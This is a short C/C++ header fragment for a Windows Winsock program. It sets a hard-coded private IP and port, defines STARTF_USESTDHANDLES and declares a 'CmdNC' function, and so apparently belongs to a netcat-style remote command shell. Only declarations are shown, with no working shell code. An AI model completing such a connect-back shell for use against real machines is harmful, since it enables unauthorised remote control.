
	#include <winsock2.h>
    #include <stdio.h>
     
    #pragma comment(lib, "Ws2_32.lib") //Inform the linker that the Ws2_32.lib file is needed.
     
    #define DEFAULT_PORT 1236
    //#define DEFAULT_IP "192.168.69.169"
	#define DEFAULT_IP "192.168.1.253"
	#define STARTF_USESTDHANDLES       0x00000100

	extern "C" int CmdNC(void);